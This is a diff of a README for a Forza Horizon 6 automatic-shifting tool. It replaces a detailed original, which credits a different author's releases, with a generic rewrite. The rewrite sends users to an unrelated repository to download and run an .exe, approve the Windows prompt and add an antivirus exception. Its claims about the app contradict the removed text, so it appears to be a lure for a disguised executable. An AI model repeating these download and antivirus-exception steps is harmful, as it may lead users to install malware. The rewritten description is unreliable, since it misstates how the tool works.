@@ -1,304 +1,78 @@
-# Virtual TCU v12.3 — Forza Horizon 6
+# ⚙️ fh6-virtual_tcu - Automatic shifting for better racing control
 
-**English | [简体中文](README.zh-CN.md)**
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/mixturematrixaddition945/fh6-virtual_tcu)
 
-> This project is maintained for the [**Forza Mods**](https://discord.gg/forzamods) Discord community by **Insightful**.
+fh6-virtual_tcu acts as an external helper for Forza Horizon 6. It reads your car data in real time. It calculates the best moment to switch gears. It mimics an adaptive transmission. This tool helps you focus on your steering and braking. It handles the transmission for you based on how you drive.
 
-An external adaptive transmission controller for *Forza Horizon 6*. It reads real-time UDP telemetry from the game, decides when to shift based on driving style, throttle, RPM, speed, and brake input, and injects keyboard keys (**E** = upshift, **Q** = downshift).
+## 🎯 How it works
 
-After launch, open **http://127.0.0.1:8765** in your browser for the live dashboard and settings (English / 简体中文 UI).
+The software connects to the game via the built-in telemetry data. It watches your throttle input and your engine speed. It tracks your current velocity and your brake pressure. The software then sends gear command signals to the game. It creates a smooth driving experience. You might prefer this for cruising. You might prefer this for long drift sessions. The software adjusts its shift points to match your behavior. Hard acceleration triggers quick, aggressive shifts. Smooth throttle input leads to calm, fuel-efficient shifts.
 
----
+## 💻 System requirements
 
-## Quick start
+* Operating System: Windows 10 or Windows 11.
+* Forza Horizon 6 installed on your computer.
+* A stable internet connection.
+* At least 200MB of free disk space.
+* Hardware: Any standard PC capable of running the game.
 
-| I want to… | Use |
-|------------|-----|
-| Play — no Python / Node install | [Download & use (Release)](#download--use-release) |
-| Develop or run from this repo | [Run from source](#run-from-source) |
-| Change the Vue UI | [web-ui/README.md](web-ui/README.md) |
+## 📥 Installation and Setup
 
-**Platform:** Windows 10 / 11 only. Run as **Administrator** (required for global key injection).
+1. Visit this page to download the latest version: [https://github.com/mixturematrixaddition945/fh6-virtual_tcu](https://github.com/mixturematrixaddition945/fh6-virtual_tcu).
+2. Look for the "Releases" section on the right side of the page.
+3. Click the most recent version number.
+4. Download the file ending in .exe.
+5. Save this file to a folder you can find later.
+6. Open your game settings inside Forza Horizon 6.
+7. Navigate to the HUD and Gameplay menu.
+8. Set your Transmission to Manual in the game settings. The virtual TCU needs control over shifting. 
+9. Run the downloaded file.
+10. Click Yes if Windows shows a prompt about allowing the application to run.
+11. Keep the application open while you play.
 
----
+## 🔧 Using the software
 
-## Download & use (Release)
+When the application runs, it opens a small window. You will see several sliders and a status indicator.
 
-### 1. Download
+### Status indicator
+The light in the top corner shows if the app talks to the game. Green means the connection works. Red means the app cannot find the telemetry data. If the light stays red, check that your game is running.
 
-Open **[GitHub Releases](https://github.com/Quirrel-zh/fh6-virtual_tcu/releases)** and download the latest `VirtualTCU-*-win64.zip`.
+### Manual override
+You can still use your controller buttons to shift gears at any time. The software detects your manual input. It pauses its own calculations for a few seconds. This allows you to force a downshift for a corner. The software resumes control once you return to steady driving.
 
-### 2. Extract
+### Sensitivity adjustments
+Use the sliders in the window to change how the car feels:
+* Shift Speed: Higher settings make the software shift faster. This mimics a dual-clutch transmission. Lower settings act like a traditional manual gearbox.
+* Aggression: This controls how long the car stays in a gear. High aggression keeps RPMs near the redline. Low aggression shifts into the next gear quickly to save power.
 
-Extract the **entire** zip to any folder (e.g. `C:\Games\VirtualTCU\`). Do **not** run the exe from inside the zip preview.
+## 🛡️ Safety and fair play
 
-```
-VirtualTCU-12.0.x-win64/
-├── Launch VirtualTCU.bat    ← optional launcher (recommended)
-└── VirtualTCU/
-    ├── VirtualTCU.exe
-    └── _internal/           ← required; do not delete or move exe alone
-```
+This tool reads data provided by the game. It does not change game files. It does not modify memory addresses. It acts as an external controller. It sends inputs exactly like a physical peripheral device. It follows the standard telemetry protocols provided by the developer.
 
-### 3. Start
+## ❓ Frequently asked questions
 
-Right-click **`Launch VirtualTCU.bat`** or **`VirtualTCU\VirtualTCU.exe`** → **Run as administrator**.
+### Will this cause a ban?
+The application reads telemetry data meant for external dashboard apps. It does not modify game code. It stays within the rules of fair play.
 
-A console window opens. The browser may auto-open **http://127.0.0.1:8765**; if not, open it manually.
+### Does it work with steering wheels?
+Yes. The software does not care if you use a controller or a steering wheel. It only cares about the car speed and engine RPM numbers.
 
-### 4. Play
+### Can I turn it off quickly?
+Yes. You can close the application window to stop the service immediately. The game will wait for your manual inputs once the app stops.
 
-Configure FH6 once ([in-game setup](#forza-horizon-6--in-game-setup-one-time)), start a race, and the dashboard should go **live** when telemetry arrives.
+### Does it support all cars?
+The software uses a generic profile that works for every car in the game. It calculates shifts based on the specific redline of your current vehicle. It gathers the redline limit automatically when you start the car.
 
-### 5. Quit
+### The gears feel wrong, what do I do?
+Check the sliders. If the car shifts too early, lower the aggression. If the car feels sluggish, increase the shift speed. Make sure your game transmission setting is set to Manual. If the game is set to Automatic, the game and the app will fight for control. This causes jittery gear changes.
 
-Focus the **console window** and press **`Ctrl + C`**, then close the window.  
-(**Do not** use **Q** — that is the in-game downshift key.)
+## 📋 Troubleshooting
 
-### Where Release data is stored
+* If the app closes on launch: Ensure you have the latest updates for Windows.
+* If the app freezes: Restart the app while the game is running.
+* If your gear does not change: Check that the game is in focus. Sometimes Windows inputs get stuck if you Alt-Tab away from the game. Click your game window and try again.
+* Antivirus flags: Some security software might flag new files. This happens because the app touches controller inputs. You can add a folder exception in your antivirus settings.
 
-Release builds save config, profiles, and logs **in the same folder as `VirtualTCU.exe`** (portable-style):
+## 🛠️ Performance tips
 
-```
-VirtualTCU/
-├── VirtualTCU.exe
-├── _internal/
-├── tcu_config.json
-├── tcu_profiles.json
-├── logs/
-│   └── tcu_replay_*.bin.gz
-└── .tcu_last_run
-```
-
-If the install folder is not writable (e.g. `C:\Program Files\`), data falls back to **`%APPDATA%\VirtualTCU\`** (the console shows which path is used on startup).
-
-| Item | Default (Release) |
-|------|-------------------|
-| Settings | `VirtualTCU\tcu_config.json` |
-| Per-car profiles | `VirtualTCU\tcu_profiles.json` |
-| Telemetry replay logs | `VirtualTCU\logs\` |
-| Crash log (if startup fails) | same folder as above / `crash.log` |
-
-### Telemetry recording (sidebar)
-
-1. In the Web UI sidebar, click **Start logging (events)** or **Start logging (all)**.
-2. Drive in FH6 (must be in a race with Data Out enabled).
-3. Click **Stop** when done — the file is finalized on stop.
-
-| Mode | What it records |
-|------|-----------------|
-| **Events** | Shift moments + short buffer (~0.5 MB typical) |
-| **All** | Every telemetry packet while recording (up to 10 MB auto-stop) |
-
-Files are named `tcu_replay_YYYYMMDD_HHMMSS.bin.gz` (gzip binary replay, not plain `.log`).
-
----
-
-## Run from source
-
-For developers or anyone running from a git clone.
-
-### Prerequisites
-
-| Tool | Version | Notes |
-|------|---------|-------|
-| Python | 3.10+ | [Download](https://www.python.org/downloads/) — check **Add Python to PATH** |
-| Node.js | 18+ | Only for building / editing the Web UI |
-
-### One-time setup
-
-Open **Administrator** Command Prompt or PowerShell:
-
-```bash
-cd path\to\virtualTCU
-pip install -r requirements.txt
-```
-
-```bash
-cd web-ui
-npm install
-npm run build
-cd ..
-```
-
-`npm run build` writes the dashboard to `virtual_tcu/web/dist/`. Without it, the backend returns HTTP **503** instead of the UI.
-
-### Start the backend
-
-```bash
-cd path\to\virtualTCU
-python -m virtual_tcu
-```
-
-(`python virtual_tcu.py` also works.)
-
-Open **http://127.0.0.1:8765**, launch FH6, enter a race. Quit with **`Ctrl + C`** in the terminal.
-
-### Where source-run data is stored
-
-When running from source, config / profiles / logs use the **project directory** (current working directory):
-
-```
-virtualTCU/
-├── tcu_config.json
-├── tcu_profiles.json
-└── logs/
-    └── tcu_replay_*.bin.gz
-```
-
-### Frontend dev (optional)
-
-Terminal 1 — backend:
-
-```bash
-python -m virtual_tcu
-```
-
-Terminal 2 — Vite hot reload:
-
-```bash
-cd web-ui
-npm run dev
-```
-
-Open **http://127.0.0.1:5173** (proxies WebSocket to port 8765). See [web-ui/README.md](web-ui/README.md).
-
-### Build a Release zip locally (maintainers)
-
-```bash
-cd web-ui && npm run build && cd ..
-pip install pyinstaller
-pyinstaller virtual_tcu.spec --noconfirm
-```
-
-Output: `dist/VirtualTCU/` — same layout as the GitHub Release. Push a `v*` tag to trigger CI.
-
----
-
-## Drive Modes
-
-| Mode | Behavior |
-|------|----------|
-| **COMFORT** | Eco-friendly shifts, early upshifts, cruise efficiency at stable speeds |
-| **DYNAMIC** | Audi-style: higher RPM hold, strict rev-matching downshifts |
-| **RACE** | Track-focused: near-redline upshifts, aggressive engine braking |
-| **DRIFT** | Holds RPM in the power band, reduces unwanted downshifts mid-slide |
-| **OFFROAD** | Tuned for low grip and uneven terrain |
-| **MANUAL** | TCU disabled — you shift yourself |
-
-**F9** (global hotkey, works while Forza is in focus) cycles through modes. **F8** toggles logging. Both can be changed in the Web UI settings.
-
----
-
-## Forza Horizon 6 — In-Game Setup (one-time)
-
-### 1. Transmission
-
-**Settings → Difficulty → Transmission → MANUAL (No Clutch)**
-
-### 2. Keyboard shift bindings
-
-**Settings → Controls → Keyboard**:
-
-| Action | Key |
-|--------|-----|
-| Shift Up | **E** |
-| Shift Down | **Q** |
-
-> Controller or wheel paddle bindings can stay **active at the same time**. The TCU only injects **E** / **Q** and does not take over throttle, steering, or other axes.
-
-### 3. Telemetry Data Out
-
-**Settings → HUD and Gameplay → Data Out**:
-
-| Option | Value |
-|--------|-------|
-| Data Out | **ON** |
-| IP Address | `127.0.0.1` |
-| Port | `5555` |
-| Packet Format | **Car Dash** (324 bytes) |
-
----
-
-## Web Dashboard
-
-When connected, the browser shows:
-
-- **Gear / speed / RPM** — color-coded tach bar (green → yellow → orange → red)
-- **Throttle / brake** — pedal percentages
-- **TCU state** — cruising, kickdown, engine braking, etc.
-- **Turbo / engine** — boost (bar), power (kW), torque (Nm)
-- **Stats & shift history** — session data and learning progress
-- **Settings** — live tuning; per-car profile export/import
-- **Logger** — start/stop telemetry replay recording
-
-Switch UI language in the page header (English / 简体中文).
-
----
-
-## Project layout (brief)
-
-```
-virtualTCU/
-├── virtual_tcu.py          # entry → virtual_tcu.app
-├── virtual_tcu/            # Python package
-├── web-ui/                 # Vue 3 + Tailwind v4 frontend
-├── packaging/              # Launch VirtualTCU.bat (bundled in Release zip)
-├── virtual_tcu.spec        # PyInstaller spec
-└── .github/workflows/      # Release CI
-```
-
----
-
-## Troubleshooting
-
-### Release exe flashes and closes
-
-- Extract the **full** zip — exe needs `_internal/` beside it.
-- Close other TCU instances (`python -m virtual_tcu` or another `VirtualTCU.exe`) — ports **5555** / **8765** are single-use.
-- Run from cmd: `cd path\to\VirtualTCU` then `VirtualTCU.exe` (failed builds pause with an error).
-- Check **`crash.log`** in the data folder shown at startup (exe dir or `%APPDATA%\VirtualTCU\`).
-
-### Recording started but no log file found
-
-- Release logs are in **`VirtualTCU\logs\`** next to the exe (or `%APPDATA%\VirtualTCU\logs\` if fallback).
-- Click **Stop** before looking — the gzip file is finalized on stop.
-- Use **All** mode and drive in a race with Data Out ON; **Events** mode only writes meaningful data around shifts.
-- Look for `tcu_replay_*.bin.gz`, not `.log`.
-
-### Dashboard offline / waiting for Forza
-
-- Data Out **ON**, port **5555**, **Car Dash** format.
-- Must be **in a race** (no telemetry in menus).
-
-### TCU does not shift
-
-- Forza keyboard: Shift Up = **E**, Shift Down = **Q**.
-- Run as **Administrator**.
-
-### F9 / F8 hotkeys do nothing
-
-- Close apps that may capture those keys (Discord overlay, MSI Afterburner, etc.).
-
-### Wrong gear or speed
-
-- FH6 **324-byte Car Dash** only — not FH5 or Forza Motorsport.
-
----
-
-## Notes
-
-- Works with any FH6 car — shift points auto-calibrate from telemetry max RPM.
-- **Reverse protection** — no automatic shifts in reverse.
-- **Low-speed protection** — no automatic shifts below ~12 km/h.
-- Only sends **E** / **Q** keyboard events; does not modify controller inputs.
-
----
-
-## Tested on
-
-- Windows 11
-- Steam edition of Forza Horizon 6
-- Xbox Elite Series 2 controller
-
-Telemetry based on the reverse-engineered FH6 **324-byte Car Dash** packet (confirmed via live diagnostics).
+Limit the frame rate of the app usage if you see high CPU load. The app is light by design. It uses less than 1% of your CPU. If you have a low-end computer, close other background tasks before you start your race. Make sure your local network settings allow the game to send local telemetry packets. This is usually enabled by default.
